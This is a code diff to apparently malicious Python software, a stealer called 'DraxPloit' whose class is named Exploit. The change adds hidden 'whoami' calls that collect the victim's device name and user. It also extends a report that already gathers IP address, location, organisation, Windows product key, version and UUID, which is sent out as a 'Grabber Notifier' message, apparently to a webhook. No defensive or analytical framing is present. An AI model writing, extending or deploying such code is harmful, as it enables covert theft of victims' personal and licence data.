@@ -74,8 +74,15 @@ class Exploit:
             w1nv3r = subprocess.check_output(sh3, creationflags=flag).decode().rstrip()
         except Exception:
             w1nv3r = "N/A"
+        try:
+            deviceName, deviceUser = subprocess.check_output(['whoami'], creationflags=flag).decode('utf-8').strip().split('\\') if '\\' in subprocess.check_output(['whoami'], creationflags=flag).decode('utf-8').strip() else ('', '')
+            deviceName = deviceName.upper()
+        except Exception:
+            deviceName = "N/A"
+            deviceUser = "N/A"
+
             
-        self.log = f"**DraxPloit** beamed a new user! ```\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}\nTimezone: {timezone}\n\nOrg: {org}\nWindows-Key: {w1nk33y}\nWindows Version: {w1nv3r}\nUUID: {uuidwndz}```"
+        self.log = f"**DraxPloit** beamed a new user! ```\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}\nTimezone: {timezone}\n\nOrg: {org}\nDevice Name: {deviceName}\nDevice User: {deviceUser}\nWindows-Key: {w1nk33y}\nWindows Version: {w1nv3r}\nUUID: {uuidwndz}```"
 
     def sendMainData(self):
         data = {"content": self.log, "username": "DraxPloit Grabber Notifier", "avatar_url": self.avatarURL}
